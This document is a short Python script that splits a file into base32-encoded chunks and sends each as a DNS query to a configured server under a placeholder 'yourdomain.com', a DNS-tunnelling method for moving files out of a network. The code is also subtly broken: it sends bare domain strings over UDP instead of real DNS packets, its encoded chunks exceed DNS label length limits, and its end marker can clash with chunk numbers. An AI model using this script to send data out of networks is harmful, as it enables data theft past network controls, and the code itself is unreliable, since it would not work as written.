import socket
import base64

# DNS server details
DNS_SERVER = "your.dns.server.ip"
DNS_PORT = 53

# File to send
file_path = "path/to/your/file.ext"
file_name = "file.ext"  # Name and extension of the file

def chunk_file(file_data, chunk_size=255):
    """Splits the file data into chunks of a given size."""
    return [file_data[i:i + chunk_size] for i in range(0, len(file_data), chunk_size)]

def send_dns_query(domain):
    """Sends a DNS query to the server."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(domain.encode(), (DNS_SERVER, DNS_PORT))

def send_file_info(file_name):
    """Sends the file name and extension to the server."""
    domain = f"{file_name}.fileinfo.fileupload.yourdomain.com"
    send_dns_query(domain)

def send_chunk(chunk, sequence_number):
    """Sends a chunk of the file as a DNS query."""
    encoded_chunk = base64.b32encode(chunk).decode('utf-8')
    domain = f"{encoded_chunk}.chunk{sequence_number}.fileupload.yourdomain.com"
    send_dns_query(domain)

def send_end_of_transmission():
    """Sends a special DNS query to signal the end of the file transmission."""
    domain = "end.chunk999.fileupload.yourdomain.com"
    send_dns_query(domain)

with open(file_path, "rb") as file:
    file_data = file.read()

# Send the file name and extension to the server
send_file_info(file_name)

# Chunk the file into smaller pieces
chunks = chunk_file(file_data)

# Send each chunk as a DNS query
for i, chunk in enumerate(chunks):
    send_chunk(chunk, i)

# Send the final chunk to signal the end of the file transmission
send_end_of_transmission()

print("File chunks sent successfully.")
